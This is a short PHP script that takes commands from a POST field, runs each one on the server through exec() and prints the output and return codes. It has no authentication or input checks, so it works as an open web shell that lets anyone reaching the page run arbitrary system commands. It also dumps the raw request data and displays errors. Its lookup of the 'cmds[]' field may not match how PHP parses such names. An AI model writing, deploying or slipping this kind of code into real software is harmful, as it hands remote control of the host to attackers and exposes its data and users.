<?php

ini_set('display_errors', 'On');

set_error_handler(function($severity, $message, $file, $line) {
    throw new \ErrorException($message, 0, $severity, $file, $line);
});

set_exception_handler(function($e) {
    header('HTTP/1.1 500 Internal Server Error');
    echo "Error on line {$e->getLine()}: " . htmlSpecialChars($e->getMessage());
    die();
});

var_dump($_POST);
echo "<hr>\n";

$outp = array();

if( is_array( $_POST['cmds[]'] ) ) { $commands = $_POST['cmds[]']; }
else { $commands=[]; }

# prepare structure to save all output/return variables...
$cmds = array();
foreach ($commands as &$cmd) {
    array_push($cmds, array($cmd, array(), -1));
}

# exec and save stdout and stderr in array
foreach ($cmds as &$elems) {
    $cmd = &$elems[0];
    $outp = &$elems[1];
    $retval = &$elems[2];
    # redirect stderr to capture as well
    exec($cmd . " 2>&1", $outp, $retval);
    #var_dump($outp);
}
unset($elems);

foreach ($cmds as $elems) {
    $cmd = &$elems[0];
    $outp = &$elems[1];
    $retval = &$elems[2];

    # screen
    echo "<pre>\n> $cmd\n--> $retval ".date(DATE_ATOM)."\n" . "------------------------------\n";
    foreach ($outp as $line) {
        echo htmlspecialchars($line)."\n";
    }
    echo "</pre>\n<hr>\n";
}
unset($elems);
?>
